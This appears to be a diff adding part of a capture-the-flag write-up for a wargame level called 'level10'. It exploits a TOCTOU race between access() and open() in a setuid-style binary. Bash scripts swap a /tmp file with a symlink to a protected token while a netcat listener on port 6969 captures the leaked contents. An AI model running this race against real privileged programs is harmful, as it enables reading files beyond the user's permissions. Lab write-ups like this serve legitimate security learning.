@@ -815,4 +815,104 @@ fflush(0xb7fd1a20Connecting to localhost:6969 .. )         = 0
                                          ^^^^ 🟡 
 ```
 
+Idea
+- it eems the program interacts with `localhiost:6969`
+- we need a valid Host IP : 
+  - `127.0.0.1` or an old trick
+  - `ifconfig | grep 'inet ' | awk 'NR==2 {print $2}' | cut -d ":" -f2`
+
+With correct IP:
+
+```b
+> ./level10 /tmp/tmp $(ifconfig | grep 'inet ' | awk 'NR==2 {print $2}' | cut -d ":" -f2)
+Connecting to Localhost:6969 .. Connected!
+Sending file .. wrote file!
+```
+
+Inspect w/ `ltrace`:
+
+```b
+> ltrace ./level10 /tmp/tmp $(ifconfig | grep 'inet ' | awk 'NR==2 {print $2}' | cut -d ":" -f2)
+.
+.
+.
+printf("Connected!\nSending file .. "Connected!
+)                     = 27
+fflush(0xb7fd1a20Sending file .. )                                         = 0
+open("/tmp/tmp", 0, 010)                                   = 4
+      ^^^^^^^^ 🟡 here is where we hope to force our token in
+
+read(4, "", 4096)                                          = 0
+write(3, "", 0)                                            = 0
+puts("wrote file!"wrote file!
+)                                        = 12
++++ exited (status 12) +++
+```
+
+Maybe it sends content of our file to `localhost:6969`
+- try and intercept the content
+- for that we use a 2nd terminal
+
+```b
+# t1
+> nc -lk 6969
+```
+```b
+# t2
+> ./level10 /tmp/tmp Localhost
+> Connecting to Localhost:6969 .. Connected!
+Sending file .. wrote file!
+```
+
+Figure out a way to make `./level10` to read the true `token`:
+- exploit `access()`'s [TOCTOU](https://stackoverflow.com/questions/75587120/how-to-handle-toctou-problem-between-access-and-unlink) vulnerability 
+- design a file to do the following:
+  - when `access()` is called it checks the low-priority file
+  - after that, `./level10` should `open()` and `read()` the high-priotity one
+
+Solution: \
+to trick `access` we need a file that _alternates_ its type
+- a file of our own permission level
+- a symlink of the same name linked to `token`
+- we need an alternation script
+
+👇
+
+`alternate.sh`
+
+```b
+#!/bin/bash
+
+t=/tmp/tmp
+
+#timeout 2s bash -c '
+while true; do
+  touch $t
+  rm -rf $t
+  ln -s /home/user/level10/token $t
+  rm -rf $t
+done
+#'
+```
+
+- a 2nd script to run `alternate` and `./level10` side by side
+- a oneliner to unite two previous ones and `netcat`
+
+`runner.s`
+
+```b
+#!/bin/bash
+
+#timeout 2s bash -c '
+while true; do
+  /home/user/level10/level10 /tmp/tmp 127.0.0.1 >/dev/null
+done
+#'
+```
+
+`oneliner`
+
+```b
+> /tmp/alternate.sh 2>/dev/null & /tmp/runner.sh 2>/dev/null & nc -lk 6969
+```
 
